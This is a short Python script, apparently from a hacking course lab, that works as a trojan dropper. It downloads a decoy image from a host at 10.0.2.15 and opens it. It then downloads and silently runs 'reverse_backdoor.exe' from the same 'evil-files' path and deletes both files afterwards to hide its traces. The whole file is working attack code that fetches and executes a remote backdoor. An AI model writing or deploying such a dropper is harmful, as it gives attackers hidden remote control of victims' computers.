#!/usr/bin/env python
import requests
import subprocess, smtplib, re, os, tempfile


# C:\Python27\python.exe -m pip install requests
def download(url):
    get_request = requests.get(url)
    # last element of list
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.2.15/evil-files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://10.0.2.15/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)


os.remove("car.jpg")
os.remove("reverse_backdoor.exe")

